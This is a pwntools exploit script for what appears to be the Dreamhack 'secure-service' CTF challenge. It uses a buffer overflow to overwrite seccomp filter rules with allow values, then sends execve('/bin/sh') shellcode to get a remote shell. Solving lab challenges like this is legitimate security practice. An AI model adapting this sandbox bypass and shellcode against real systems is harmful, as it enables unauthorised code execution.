#!/usr/bin/env python3
from pwn import *

PORT = 9204
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./secure-service', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

ret_allow = p16(6) + b'\x00\x00' + p32(0x7fff0000)

payload = (
    b'A' * 0x80 +
    ret_allow * 3 +
    b'B' * 0x68 +
    b'\x02'
)

sla(b'which method? ', b'bof')
sla(b'payload: ', payload)

# Stage 2: Execute shellcode
sc = asm('''
    xor esi, esi
    xor edx, edx
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp
    mov eax, 59
    syscall
''')

sla(b'which method? ', b'shellcode')
sa(b'shellcode: ', sc)


p.interactive()